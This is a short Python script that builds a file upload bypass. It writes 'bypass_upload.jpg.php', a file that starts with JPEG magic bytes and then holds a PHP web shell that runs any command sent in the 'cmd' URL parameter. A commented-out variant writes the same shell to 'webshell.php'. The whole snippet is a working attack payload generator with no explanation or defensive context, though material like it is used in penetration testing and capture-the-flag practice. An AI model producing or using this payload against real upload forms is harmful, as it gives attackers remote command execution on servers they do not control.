##fh = open('webshell.php', 'w')
#fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
#fh.close()
with open('bypass_upload.jpg.php', 'wb') as fh:
    fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
